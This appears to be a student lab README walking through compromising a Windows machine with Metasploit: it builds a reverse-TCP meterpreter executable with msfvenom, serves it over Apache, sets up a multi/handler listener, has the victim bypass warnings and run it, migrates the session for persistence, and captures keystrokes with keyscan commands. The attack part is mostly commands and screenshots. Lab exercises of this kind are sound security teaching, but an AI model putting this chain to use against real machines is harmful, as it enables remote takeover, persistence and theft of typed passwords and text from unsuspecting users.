# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:

![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/aad11ad5-4330-4006-b863-a69ac266473b)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT
![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/b010e32d-f4bd-41cb-bc29-60188dec6033)


copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/5d8207f5-6825-4190-8bcc-3d9c4b64c690)


Start apache server
sudo systemctl apache2 start

![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/1a4df67c-46b5-4e10-9168-d8fdab5516d7)


Check the status of apache2

![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/87601630-7923-40ba-92cb-854c5621bba2)



Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler

![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/6505235f-d553-4f54-8261-6a0f3b143584)

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/e23d1d2a-5dc0-4582-ad5a-d4160041f365)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/2a8922ed-fbc9-41e5-8123-9cb17a99c2be)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/0b1852ab-2073-4d30-a4d0-c0ce680ace03)



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/bfa4c4fc-a2c8-4fe8-a2b1-f3145793a01b)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/a4c7b8fc-2b07-4085-8067-be4dd166ad06)

keyscan_dump	Shows the keystrokes captured so far

![image](https://github.com/sreekarsh/Compromising-windows-using-Metasploit/assets/139841918/e90f0ad4-cb67-43c5-8b33-02dc8c254412)







## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
